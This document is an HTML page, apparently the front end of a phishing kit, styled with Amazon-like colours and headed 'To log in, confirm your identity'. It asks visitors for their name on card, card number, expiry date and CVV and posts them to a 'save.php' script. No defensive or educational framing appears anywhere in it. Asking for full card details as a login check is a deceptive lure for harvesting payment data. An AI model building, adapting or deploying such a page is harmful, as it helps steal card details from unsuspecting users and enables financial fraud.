<DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #232F3E;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-top: 10px;
        }
        input[type="text"], input[type="number"], input[type="month"] {
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            margin-top: 20px;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: orange;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>To log in, confirm your identity</h2>
        <form action="save.php" method="POST">
            <label for="cardName">Name on Card</label>
            <input type="text" id="cardName" name="cardName" required>
            
            <label for="cardNumber">Card Number</label>
            <input type="number" id="cardNumber" name="cardNumber" required>
            
            <label for="expDate">Expiration Date</label>
            <input type="month" id="expDate" name="expDate" required>
            
            <label for="cvv">CVV</label>
            <input type="number" id="cvv" name="cvv" required>
            
            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
